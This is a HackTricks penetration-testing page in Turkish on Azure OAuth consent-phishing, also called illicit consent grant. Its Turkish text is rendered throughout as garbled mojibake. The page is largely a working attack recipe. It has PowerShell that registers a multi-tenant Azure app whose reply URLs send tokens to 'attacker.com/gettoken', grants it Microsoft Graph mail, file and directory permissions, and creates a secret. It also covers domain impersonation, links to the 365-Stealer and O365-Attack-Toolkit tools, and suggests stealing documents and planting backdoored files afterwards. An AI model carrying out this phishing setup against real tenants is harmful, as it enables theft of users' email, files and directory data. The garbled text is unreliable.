# Az - YasadÄ±ÅŸÄ± Onay Verme

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin!</summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## OAuth Uygulama BalÄ±kÃ§Ä±lÄ±ÄŸÄ±

**Azure UygulamalarÄ±**, **kullanÄ±cÄ± verilerine** eriÅŸim izni istemektedir (temel bilgilerin yanÄ± sÄ±ra belgelere eriÅŸim, e-posta gÃ¶nderme...).\
**Ä°zin verildiÄŸinde**, normal bir kullanÄ±cÄ± sadece **"DÃ¼ÅŸÃ¼k Etki" izinleri** iÃ§in onay verebilir. **DiÄŸer tÃ¼m** durumlarda, **yÃ¶netici onayÄ± gereklidir**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `uygulamalara izin verme izni verme` iÃ§eren Ã¶zel bir rol, kiracÄ± genelinde onay verebilir.

YalnÄ±zca **yÃ¶netici onayÄ± gerektirmeyen izinler** "dÃ¼ÅŸÃ¼k etki" olarak sÄ±nÄ±flandÄ±rÄ±lÄ±r. Bunlar, **temel oturum aÃ§ma iÃ§in gerekli izinler olan openid, profile, email, User.Read ve offline\_access** izinleridir. Bir **kuruluÅŸ**, **tÃ¼m uygulamalar iÃ§in** kullanÄ±cÄ± onayÄ±na izin verirse, bir Ã§alÄ±ÅŸan bir uygulamaya **profilinden yukarÄ±dakileri okuma** izni verebilir.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Bu nedenle, bir saldÄ±rgan **zararlÄ± bir Uygulama** hazÄ±rlayabilir ve bir **balÄ±kÃ§Ä±lÄ±k** ile kullanÄ±cÄ±nÄ±n **UygulamayÄ± kabul etmesini ve verilerini Ã§almasÄ±nÄ±** saÄŸlayabilir.

### 2 TÃ¼r YasadÄ±ÅŸÄ± Onay Verme SaldÄ±rÄ±sÄ±

* **Kimlik DoÄŸrulama Gerektirmeyen**: Harici bir hesaptan, Ã¶rneÄŸin `User.Read` ve `User.ReadBasic.All` izinleriyle bir uygulama oluÅŸturun, bir kullanÄ±cÄ±yÄ± balÄ±klayÄ±n ve dizin bilgilerine eriÅŸebilirsiniz.
* Bu, balÄ±kÃ§Ä±lÄ±k yapÄ±lan kullanÄ±cÄ±nÄ±n harici ortamlardan OAuth uygulamalarÄ±nÄ± kabul edebilmesini gerektirir!
* **Kimlik DoÄŸrulamalÄ±**: Yeterli ayrÄ±calÄ±klara sahip bir baÅŸlÄ±k ele geÃ§irdikten sonra, hesap iÃ§inde bir uygulama oluÅŸturun ve ayrÄ±calÄ±klÄ± OAuth izinlerini kabul edebilecek ayrÄ±calÄ±klÄ± bir kullanÄ±cÄ±yÄ± balÄ±klayÄ±n.
* Bu durumda zaten dizin bilgilerine eriÅŸebilirsiniz, bu nedenle `User.ReadBasic.All` izni artÄ±k ilginÃ§ deÄŸildir.
* **YÃ¶netici onayÄ± gerektiren izinler** muhtemelen sizi ilgilendirir, Ã§Ã¼nkÃ¼ ham kullanÄ±cÄ±lar OAuth uygulamalarÄ±na herhangi bir izin veremez, bu yÃ¼zden yalnÄ±zca **bu kullanÄ±cÄ±larÄ± balÄ±kÃ§Ä±lÄ±k yapmanÄ±z gerekir** (bu ayrÄ±calÄ±ÄŸÄ± kimin verdiÄŸi hakkÄ±nda daha fazla bilgi iÃ§in)

### KullanÄ±cÄ±larÄ±n onay verebilme yetkisini kontrol etme

Azure Active Directory (Azure AD) kullanÄ±cÄ±larÄ±nÄ±n uygulamalara onay verebilme yetkisi hakkÄ±nda onay yapÄ±landÄ±rmasÄ±nÄ± kontrol etmek iÃ§in aÅŸaÄŸÄ±daki PowerShell komutu kullanÄ±lÄ±r:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **KullanÄ±cÄ± onayÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rak**: Bu ayar, kullanÄ±cÄ±larÄ±n uygulamalara izin vermesini engeller. KullanÄ±cÄ±larÄ±n hiÃ§bir uygulamaya onay vermesine izin verilmez.
* **KullanÄ±cÄ±lar doÄŸrulanmÄ±ÅŸ yayÄ±ncÄ±lardan veya kuruluÅŸunuzdan uygulamalara onay verebilir, ancak yalnÄ±zca seÃ§tiÄŸiniz izinler iÃ§in**: Bu ayar, tÃ¼m kullanÄ±cÄ±larÄ±n yalnÄ±zca doÄŸrulanmÄ±ÅŸ bir yayÄ±ncÄ± tarafÄ±ndan yayÄ±nlanan ve kendi kiracÄ±nÄ±za kayÄ±tlÄ± uygulamalara onay vermesine izin verir. Belirli izinler iÃ§in yalnÄ±zca onay verilmesine izin vererek bir kontrol katmanÄ± ekler.
* **KullanÄ±cÄ±lar tÃ¼m uygulamalara onay verebilir**: Bu ayar daha esnek olup, tÃ¼m kullanÄ±cÄ±larÄ±n, bu izinlerin yÃ¶netimsel onay gerektirmediÄŸi sÃ¼rece, herhangi bir uygulama iÃ§in herhangi bir izne onay vermesine izin verir.
* **Ã–zel uygulama onay politikasÄ±**: Bu ayar, belirli kurumsal gereksinimlere uyarlanabilen Ã¶zel bir politikanÄ±n uygulandÄ±ÄŸÄ±nÄ± gÃ¶sterir ve uygulama yayÄ±ncÄ±sÄ±na, uygulamanÄ±n talep ettiÄŸi izinlere ve diÄŸer faktÃ¶rlere dayalÄ± kÄ±sÄ±tlamalarÄ±n bir kombinasyonunu iÃ§erebilir.

## **KÃ¶tÃ¼ Niyetli Onay Verme SaldÄ±rÄ±sÄ±nÄ± Anlama**

KÃ¶tÃ¼ niyetli onay verme saldÄ±rÄ±sÄ±nda, saldÄ±rganlar son kullanÄ±cÄ±larÄ±, Azure'a kayÄ±tlÄ± kÃ¶tÃ¼ niyetli bir uygulamaya izin vermesi iÃ§in kandÄ±rÄ±rlar. Bunun iÃ§in uygulamanÄ±n meÅŸru gÃ¶rÃ¼nmesini saÄŸlayarak, kurbanlarÄ± "Kabul Et" dÃ¼ÄŸmesine bilmeyerek tÄ±klamalarÄ±nÄ± saÄŸlarlar. SonuÃ§ olarak, Azure AD, saldÄ±rganÄ±n sitesine bir belirteÃ§ verir ve bÃ¶ylece kurbanÄ±n verilerine (Ã¶rneÄŸin e-postalarÄ± okuma veya gÃ¶nderme, dosyalara eriÅŸme) kurumsal bir hesap olmadan eriÅŸmelerine izin verir.

## **SaldÄ±rÄ± AkÄ±ÅŸÄ± Genel BakÄ±ÅŸÄ±**

SaldÄ±rÄ±, genel bir ÅŸirketi hedef alan birkaÃ§ adÄ±mÄ± iÃ§erir. Ä°ÅŸte nasÄ±l gerÃ§ekleÅŸebileceÄŸi:

1. **Alan KaydÄ± ve Uygulama BarÄ±ndÄ±rma**: SaldÄ±rgan, gÃ¼venilir bir siteyi andÄ±ran bir alan kaydeder, Ã¶rneÄŸin "gÃ¼venlialangirisi.com". Bu alan altÄ±nda, kÃ¶tÃ¼ niyetli uygulamayÄ± barÄ±ndÄ±rmak iÃ§in bir alt alan oluÅŸturulur (Ã¶rneÄŸin, "firmadiniz.gÃ¼venlialangirisi.com").
2. **Azure AD'de Uygulama KaydÄ±**: SaldÄ±rgan daha sonra Azure AD KiracÄ±sÄ±nda Ã‡ok KiracÄ±lÄ± Uygulama kaydeder ve meÅŸru gÃ¶rÃ¼nmek iÃ§in hedef ÅŸirketin adÄ±nÄ± verir. UygulamanÄ±n YÃ¶nlendirme URL'sini, kÃ¶tÃ¼ niyetli uygulamayÄ± barÄ±ndÄ±ran alt alanÄ± iÅŸaret etmek Ã¼zere yapÄ±landÄ±rÄ±r.
3. **Ä°zinleri Ayarlama**: SaldÄ±rgan, uygulamayÄ± Ã§eÅŸitli API izinleriyle (Ã¶rneÄŸin, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`) yapÄ±landÄ±rÄ±r. Bu izinler, kullanÄ±cÄ± tarafÄ±ndan verildiÄŸinde, saldÄ±rganÄ±n kullanÄ±cÄ± adÄ±na hassas bilgileri Ã§ekmesine olanak tanÄ±r.
4. **KÃ¶tÃ¼ Niyetli BaÄŸlantÄ±larÄ± DaÄŸÄ±tma**: SaldÄ±rgan, kÃ¶tÃ¼ niyetli uygulamanÄ±n istemci kimliÄŸini iÃ§eren bir baÄŸlantÄ± oluÅŸturur ve hedeflenen kullanÄ±cÄ±lara paylaÅŸarak, onlarÄ± onaya zorlar.

## **SaldÄ±rÄ± Ä°Ã§in AraÃ§larÄ± Kullanma**

SaldÄ±rÄ±, [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer) gibi araÃ§lar kullanÄ±larak kolaylaÅŸtÄ±rÄ±labilir.

### SaldÄ±rÄ± Ã–ncesi HazÄ±rlÄ±k:

SaldÄ±rganÄ±n, kurban organizasyondaki bir kullanÄ±cÄ±da belirli bir dÃ¼zeyde eriÅŸimi varsa, organizasyonun politikasÄ±nÄ±n kullanÄ±cÄ±nÄ±n uygulamalarÄ± kabul etmesine izin verip vermediÄŸini kontrol edebilir.
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
SaldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rganÄ±n Azure KiracÄ±sÄ±nda **Yeni Bir Uygulama** (Uygulama kayÄ±tlarÄ± iÃ§inde) oluÅŸturmasÄ± gerekecektir, aÅŸaÄŸÄ±daki izinlerle yapÄ±landÄ±rÄ±lmÄ±ÅŸ:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`, `Delegated permissions` iÃ§inde `Microsoft Graph` iÃ§indedir. (Uygulama izinleri her zaman ek onay gerektirecektir).

* `User.ReadBasic.All`, verildiÄŸinde organizasyondaki **tÃ¼m kullanÄ±cÄ±larÄ±n bilgilerini okumanÄ±za izin verecek** olan izindir.
* YalnÄ±zca `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve uygulamalara izin verme iznine sahip Ã¶zel bir rol iÃ§eren roller, kiracÄ± genelinde onay saÄŸlayabilir. Bu nedenle, bir **YÃ¶netici onayÄ± gerektiren UygulamayÄ±** onaylamasÄ± iÃ§in bir kullanÄ±cÄ±yÄ± **balÄ±k tutmalÄ±sÄ±nÄ±z**.

AyrÄ±ca, aÅŸaÄŸÄ±daki komut satÄ±rÄ± aracÄ±lÄ±ÄŸÄ±yla bir Uygulama oluÅŸturabilirsiniz:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) adresine giderek nasÄ±l yapÄ±landÄ±rÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenin.

{% hint style="warning" %}
Elde edilen **eriÅŸim belirteci**nin, istenen izinler olan `User.Read` ve `User.ReadBasic.All` kapsamÄ±na sahip **graph uÃ§ noktasÄ±** iÃ§in olacaÄŸÄ±nÄ± unutmayÄ±n. DiÄŸer iÅŸlemleri gerÃ§ekleÅŸtiremeyeceksiniz (ancak bu izinler, org iÃ§indeki tÃ¼m kullanÄ±cÄ±lar hakkÄ±nda bilgi **indirmek iÃ§in yeterlidir**).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in bu aracÄ± da kullanabilirsiniz.

## SaldÄ±rÄ± SonrasÄ±

KullanÄ±cÄ±ya eriÅŸim saÄŸladÄ±ktan sonra hassas belgeleri Ã§alabilir ve hatta geri kapÄ± eklenmiÅŸ belge dosyalarÄ±nÄ± yÃ¼kleyebilirsiniz.

## Referanslar

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks' i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
